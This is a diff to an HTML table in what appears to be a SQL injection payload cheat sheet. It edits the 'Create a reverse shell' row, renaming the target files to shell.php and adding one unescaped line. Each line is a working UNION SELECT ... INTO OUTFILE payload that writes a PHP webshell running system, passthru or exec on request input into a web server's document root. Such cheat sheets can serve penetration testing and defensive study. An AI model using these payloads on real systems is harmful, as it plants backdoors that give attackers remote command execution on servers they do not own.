@@ -746,9 +746,10 @@ layout: default
 		<tr>
 			<td>Create a reverse shell</td>
 			<td>
-				<li>&apos; UNION SELECT (&lt;?php system($_REQUEST[&quot;cmd&quot;]);) INTO OUTFILE &apos;/var/www/html/cmd.php&apos;;-- -</li>
-				<li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE &#039;C:/xampp/htdocs/cmd.php&#039;  -- -</li>
-				<li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE &#039;/srv/http/cmd.php&#039;;-- -</li>
+				<li>' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';-- -</li>
+				<li>&apos; UNION SELECT (&lt;?php system($_REQUEST[&quot;cmd&quot;]);) INTO OUTFILE &apos;/var/www/html/shell.php&apos;;-- -</li>
+				<li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE &#039;C:/xampp/htdocs/shell.php&#039;  -- -</li>
+				<li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE &#039;/srv/http/shell.php&#039;;-- -</li>
 			</td>
 		</tr>
 	</table>
